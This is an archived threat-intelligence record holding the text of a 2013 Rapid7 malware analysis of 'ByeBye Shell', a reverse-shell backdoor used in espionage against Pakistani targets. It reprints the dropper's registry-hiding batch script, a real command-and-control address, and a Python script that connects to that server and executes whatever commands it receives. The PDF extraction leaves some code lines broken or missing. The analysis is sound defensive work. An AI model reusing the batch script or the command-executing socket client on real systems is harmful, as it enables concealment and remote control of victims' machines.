{
    "id": "0bd55ff7-10f9-4e88-80b3-f92539a31e76",
    "created_at": "2022-10-25T16:48:24.71392Z",
    "updated_at": "2025-03-27T02:16:25.670026Z",
    "deleted_at": null,
    "sha1_hash": "4b6cc1420b5d641564c9895882a5ba97d18137be",
    "title": "Byebye Shell And The Targeting Of Pakistan",
    "authors": "Rapid7",
    "file_creation_date": "2014-01-15T22:21:53Z",
    "file_modification_date": "2014-01-15T22:21:53Z",
    "file_size": 1314796,
    "plain_text": "### Information Security Pre\n\n# ByeBye Shell and the targeting of Pakistan\n\nPosted by Claudio Guarnieri in Information Security on Aug 19, 2013 2:10:45 PM\n\nAsia and South Asia are a theater for daily attacks and numerous ongoing espionage campaigns between\nneighboring countries, so many campaigns that it's hard to keep count. Recently I stumbled on yet another one,\nwhich appears to have been active since at least the beginning of the year, and seems mostly directed at Pakistani\ntargets.\n\nIn this article we're going to analyze the nature of the attacks, the functionality of the backdoor - here labelled as\n**ByeBye\n Shell - and the quick interaction I had with the operators behind this campaign.**\n\n## Infection\n\nNo exploit was used in any of the attacks we attribute to this campaign - the attackers probably just relied on\nsocial engineering the victim through well-crafted spearphishing emails.\nThe malware first appears to the victim as a .scr file. In some cases the attackers make use of the Left-to-Right\nOverride Unicode character in order to twist the .exe file extension into something more credible.\nOnce executed it drops and launches a batch script in a %Temp% subfolder with the following content:\n\n01. @ echo off\n02. @ start \"IEXPLORE.EXE\" \"<backdoor>\"\n03. @ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t R\n04. @ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt\n05. @ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHi\n06. @ reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\\n07. @ exit\n\nAs you can see, it enforces some configuration in the registry in order to hide file extensions and not show hidden\nfolders.\nSubsequently the malware creates and launches a Cabinet\n Self-Extractor, which drops two additional executable\nfiles: one embedding either a PDF or a Microsoft Office Word document, the other being the actual backdoor.\nThese are the hashes\n of\n the\n original\n droppers I inspected during this analysis:\n\n8b4224dac114a9b8433913a1977f88b2\n\n469cf94c457c17d8f24dacf9f9d41f33\n\n6b349e439a17c4b66fb2a25965432aa9\n\nd36da5c48d8fb7ee8c736ae183bf3f8a\n\nThe embedded documents all show content revolving around internal\n or\n foreign\n Pakistan\n politics - following are\nsome examples of such documents:\n\n\n-----\n\nThis document appears to report an article that appeared on Hilal, the magazine of the Pakistan Armed Forces. You\ncan find a copy of the original article on this Pakistan institutional website.\n\n\n-----\n\nAlso in this case the attacker seems to have just reused an existing article. Searching online for the content, it\nappears to have been originally published on a website called SATribune, which is no longer online.\nYou can find a copy of the full article here.\n\n\n-----\n\nAgain, the original article is available on Dawn.com.\n\n\n-----\n\nThis last one coming instead from Reuters.\n\n## Backdoor\n\nLet's face it: at the point where the attackers obtain control over the target computer, not\n much\n sophistication\n is\n**left\n in\n day-to-day\n targeted\n attacks. PoisonIvy, Gh0st and custom backdoors are daily business for threat analysts**\nand malware researchers, in most cases being tedious work with little technical challenge.\nThis campaign is no exception. The main backdoor installed and executed on the victims' systems appears to be a\ncustom reverse shell with just a handful of features. Due to a lack of public literature about this case, I decided to\ndub this family as ByeByeShell.\n\nWhen disassembling the binary you can quickly understand the mechanics of the backdoor. After some quick\n\ninitialization, the backdoor XORs an embedded string with 0x9D to extract the IP address of the C&C server.\n\nSubsequently it establishes a connection to it (generally on port 80) and checks in with some basic information\n\nabout the system.\n\nLAB-­OF-­Me:\n\n10.0.2.15............................................................UserName: User\n\nHostName:lab\n\nMAC: <MAC address>\n\n\n-----\n\nAs you can see, it reports the computer name, the user name, the IP address and MAC address of the network\nadapter. The [P130813] line appears to be a constant value, possibly a target identifier.\nInterestingly, in a specific malware sample belonging to this campaign, the backdoor also appends the string \"INS\n\n**and AfPak\" at the end of the message - note that, as defined by Wikipedia, \"AfPak\n (or\n Af-Pak)\n is\n a\n neologism**\n\n_used\n within\n US\n foreign\n policy\n circles\n to\n designate\n Afghanistan\n and\n Pakistan\n as\n a\n single\n theater\n of\n operations\"._\nAfter the check-in message is sent, the malware enters a continuous loop in which it will keep silently waiting for\ncommands from the open socket connection. From now on, it expects some manual interaction from the attacker.\nThe supported commands are:\n\n**shell**\n\n**comd**\n\n**sleep**\n\n**quit**\n\n**kill**\n\nYou can see the switch block in the following screenshots.\n\n\n-----\n\nWhen a message is received from the socket connection, it checks\n if\n the\n message\n is\n \"shell\"\n then\n spawn\n a\n**reverse\n shell, otherwise continues by checking for \"comd\"\n which\n will\n simply\n execute\n a\n command and returns.**\n\n\n-----\n\nIf neither \"shell\" or \"comd\" is specified by the operator, it checks if it has been instructed to sleep or terminate,\notherwise it just continues to the next iteration.\n\nIn the following screenshot you can see how the reverse shell is implemented:\n it\n just\n launches\n a\n cmd.exe\n and\n**pipes\n stdin,\n stdout\n and\n stderr\n to\n the\n opened\n socket so that the operator can directly interact with the Windows**\nprompt.\n\n\n-----\n\nAs you can see, this is an extremely basic backdoor, even poorly written if you ask me. Antivirus detection rate is\nalso reasonably good, despite consisting mostly of generic signatures.\n\nThe samples are also signed with an invalid Microsoft Windows certificate, which can be used for further\nfingerprinting:\n\n\n01. Certificate:\n02. Data:\n03. Version: 3 (0x2)\n04. Serial Number:\n05. 5b:b2:39:83:49:9b:89:a0:43:a8:10:3a:67:24:13:78\n06. Signature Algorithm: md5WithRSAEncryption\n07 I CN Mi ft Wi d\n\n\n-----\n\n11. Subject: CN=Microsoft Windows\n12. Subject Public Key Info:\n13. Public Key Algorithm: rsaEncryption\n14. Public-­Key: (1024 bit)\n15. Modulus:\n16. 00:c6:e9:0c:5e:0a:09:39:db:58:a8:03:6c:60:da:\n17. 32:ad:c5:3d:9a:39:91:ca:93:9f:ac:39:aa:3d:45:\n18. 54:a7:63:e0:a7:c3:b0:b6:ee:2b:6c:bd:83:f9:9b:\n19. 9b:e1:df:0d:e1:2a:96:e3:99:5e:52:0e:c7:c5:63:\n20. 91:b4:e9:37:63:be:4b:62:23:2e:b8:00:f0:48:22:\n21. 1e:ef:60:16:99:a4:08:2c:66:72:26:a2:68:1d:66:\n22. a4:22:ff:a5:72:7a:ad:f8:78:9c:1f:2e:89:49:62:\n23. f4:ba:6d:7f:f5:04:b1:9b:29:58:13:1d:f9:0f:a6:\n24. 86:95:95:92:0b:57:9c:ca:39\n25. Exponent: 65537 (0x10001)\n26. X509v3 extensions:\n27. 2.5.29.1:\n28. 0D..g.yY,.^.Oxz..../..0.1.0...U....Microsoft Windows..[.9.I...C..:g$.x\n29. Signature Algorithm: md5WithRSAEncryption\n30. bd:b3:b3:95:14:aa:55:0d:80:4a:7b:d5:54:e9:43:e9:e1:36:\n31. c1:7b:25:64:4b:a4:35:6f:55:81:d1:f5:9d:69:87:04:f3:8d:\n32. 05:0a:49:31:0e:49:11:62:97:85:42:b4:37:63:ce:88:77:59:\n33. 44:9c:83:03:9c:bb:95:f8:f4:8d:15:b5:1c:96:d4:af:ea:50:\n34. 0a:cf:53:38:01:ed:00:6c:a0:90:f6:4c:8c:80:12:f3:ac:38:\n35. b1:4f:d9:e9:d1:2b:8b:40:0e:9e:6b:38:45:a1:90:2d:fe:79:\n36. 92:6d:f8:98:f1:a7:bf:9b:8d:7a:bc:89:77:12:33:29:6e:7e:\n37. d2:ff\n\n## Playing with the Attacker\n\nIn all the cases presented in this blog post, the backdoors tried to connect to the C&C located at 46.165.207.134,\nwhich appears to be a dedicated server hosted by Leaseweb:\n\ninetnum:        46.165.200.0 -­ 46.165.207.255\n\nnetname:        NETDIRECT-­NET\n\ndescr:          Leaseweb Germany GmbH (previously netdirekt e. K.)\n\nremarks:        INFRA-­AW\n\ncountry:        DE\n\nadmin-­c:        LSWG-­RIPE\n\ntech-­c:         LSWG-­RIPE\n\nstatus:         ASSIGNED PA\n\nmnt-­by:         NETDIRECT-­MNT\n\nmnt-­lower:      NETDIRECT-­MNT\n\nmnt-­routes:     NETDIRECT-­MNT\n\nsource:         RIPE # Filtered\n\nAt the time of writing, the server appears to still be online. However port 80, which the backdoors try to contact,\nappears to be available only sporadically. In order to get some fun out of an overall straightforward analysis, I\nquickly hacked together a\n Python\n script\n that\n emulates\n a\n ByeBye\n backdoor - following is the code:\n\n01. import os\n02. import sys\n03. import socket\n04. import subprocess\n05\n\n\n-----\n\n09. buf += \"HostName:HOMEPC\\n\"\n10. buf += \"MAC: <MAC ADDRESS>\\n\"\n11. buf += \"Address 0: 192.168.0.5\\n\"\n12. buf += \"[P100713]\\n\"\n13. buf += \"$\"\n14.\n15. # Emulating cmd.exe, hacky but works.\n16. cmd = \"Microsoft Windows XP [Version 5.1.2600]\\n\"\n17. cmd += \"(C) Copyright 1985-­2001 Microsoft Corp.\\n\"\n18. prompt = \"C:\\Documents and Settings\\User> \"\n19.\n20. print(\"[*] Trying to connect to C&C...\")\n21.\n22. # Try to establish connection with the C&C.\n23. while True:\n24. try:\n25. sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n26. sock.connect((host, 80))\n27. except Exception as e:\n28. print(\"[!] ERROR: Unable to connect: {0}\".format(e))\n29. sock.close()\n30. continue\n31. else:\n32. subprocess.Popen('start alarm.mp3', shell=True)\n33. break\n34.\n35. print(\"[*] Connected to C&C!\")\n36.\n37. # Send check-­in message.\n38. sock.send(buf)\n39.\n40. print(\"[*] Authenticated to C&C!\")\n41.\n42. # This flag represents whether we should currently emulate a cmd.exe prompt\n43. # or emulate the backdoor shell.\n44. shell_mode = False\n45.\n46. # Main loop.\n47. while True:\n48. # Wait for incoming command.\n49. try:\n50. bufin = sock.recv(1024)\n51. except KeyboardInterrupt:\n52. break\n53. except Exception as e:\n54. print(\"[!] ERROR: Connection lost: {0}\".format(e))\n55. break\n56.\n57. data = bufin.strip()\n58. if len(data) == 0:\n59. continue\n60.\n61. print(\"[+] Received: {0}\".format(data))\n62.\n63. # If we are in cmd.exe mode...\n64. if shell_mode:\n65. # If he tries to exit the cmd, we emulate that.\n\n\n-----\n\n69. continue\n70. # If he tries to shutdown the system, I'm gonna interrupt.\n71. elif 'shutdown' in data:\n72. break\n73. # I don't want him to kill processes.\n74. elif 'taskkill' in data:\n75. continue\n76. # Otherwise just execute the command.\n77. else:\n78. proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.P\n79. (out, err) = proc.communicate()\n80.\n81. if out:\n82. lines = out.split('\\n')\n83. out_lines = []\n84. for line in lines:\n85. # Can filter output here, for instance remove process\n86. # names or VirtualBox indicators and such.\n87.\n88. out_lines.append(line)\n89.\n90. # Send the findal cmd output.\n91. sock.send('\\n'.join(out_lines))\n92. if err:\n93. sock.send(err)\n94.\n95. sock.send(prompt)\n96. else:\n97. if data == 'kill':\n98. # Should do this:\n99. #sock.send('KILLED')\n100. # But I'm disappointed:\n101. sock.send('NOOooOOooOOooOOoo :-­( I thought we were friends!')\n102. break\n103. elif data == 'shell':\n104. sock.send(cmd)\n105. sock.send(prompt)\n106. shell_mode = True\n107. continue\n108. elif data == 'sleep':\n109. sock.send('BYE BYE\\n')\n110.\n111. sock.send('$')\n112.\n113. if __name__ == '__main__':\n114. if len(sys.argv) == 2:\n115. main(sys.argv[1])\n116. else:\n117. main()\n\nAs you can see, this script simply tries to emulate the basic functionality of ByeBye: it performs the initial check-in\nand waits for incoming messages from the operator.\nYes - since, as previously said, the C&C comes online only at times - I instructed the script to play an extremely\nloud alarm. Props to my flatmate for waking me up whenever the alarm went off.\nSurprisingly the operator responded few moments later my first attempt, although\n he\n quickly\n tried\n to\n terminate\n me\nprobably noticing an unexpected origin:\n\n\n-----\n\n[+] Received: shell\n\n[+] Received: shutdown /r /t 0\n\nUnfortunately at that time I didn't have the script completed, therefore he noticed something odd and closed my\nconnection.\nI let a few days pass, completed the script and prepared a more credible scenario: a legitimate looking system\nconnecting out of South Asia. This time it took a bit longer to get some response from the operator, who simply\n**tried\n to\n search\n for\n documents\n on\n the\n system:**\n\n[+] Received: shell\n\n[+] Received: systeminfo\n\n[+] Received: dir /s *.pdf\n\n[+] Received: dir /s *.doc\n\n[+] Received: exit\n\n[+] Received: sleep\n\nSadly no further activity was observed.\n\n## Conclusions\n\nThis is yet another case of poorly skilled attackers managing to run successful espionage campaigns for extended\nperiods of time. This is probably one of the most basic incidents I encountered so far, but we can safely assume\nthat the operators behind this campaign are successful enough to maintain the operations running for at least the\nlast 6 months, possibly even more.\nNo clear indicator is available to make an informed estimate on what could be the origin of the attacks.\n\nThis work was brought to you by Claudio \"nex\" Guarnieri, Rapid7 Labs.\n\n6940 Views Tags: malware, targeted, pakistan\n\nAverage User Rating\n\n(2 ratings)\n\n#### 0 Comments\n\n**Please\n login\n to\n comment**\n\nThere are no comments on this post\n\nHome  | Top of page  | Rapid7.com | Metasploit.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/a4a59w1go5opcj607ssoh11oqnhozv0h",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.08.19.ByeBye_Shell/ByeBye_Shell_target.pdf"
    ],
    "report_names": [
        "ByeBye_Shell_target"
    ],
    "threat_actors": [
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1389824513,
    "ts_modification_date": 1389824513,
    "files": {
        "pdf": "https://archive.orkl.eu/4b6cc1420b5d641564c9895882a5ba97d18137be.pdf",
        "text": "https://archive.orkl.eu/4b6cc1420b5d641564c9895882a5ba97d18137be.txt",
        "img": "https://archive.orkl.eu/4b6cc1420b5d641564c9895882a5ba97d18137be.jpg"
    }
}